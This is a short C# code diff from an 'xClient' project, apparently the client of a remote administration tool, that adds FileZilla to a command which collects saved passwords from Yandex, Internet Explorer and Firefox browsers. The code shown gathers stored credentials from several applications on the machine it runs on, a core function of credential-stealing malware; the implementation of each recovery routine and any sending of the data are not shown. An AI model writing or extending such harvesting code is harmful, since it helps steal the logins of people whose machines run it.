@@ -11,6 +11,7 @@ using xClient.Enums;
 using System.Collections.Generic;
 using xClient.Core.Data;
 using xClient.Core.Recovery.Browsers;
+using xClient.Core.Recovery.FtpClients;
 
 namespace xClient.Core.Commands
 {
@@ -26,6 +27,7 @@ namespace xClient.Core.Commands
             recovered.AddRange(Yandex.GetSavedPasswords());
             recovered.AddRange(InternetExplorer.GetSavedPasswords());
             recovered.AddRange(Firefox.GetSavedPasswords());
+            recovered.AddRange(FileZilla.GetSavedPasswords());
 
             List<string> raw = new List<string>();
 
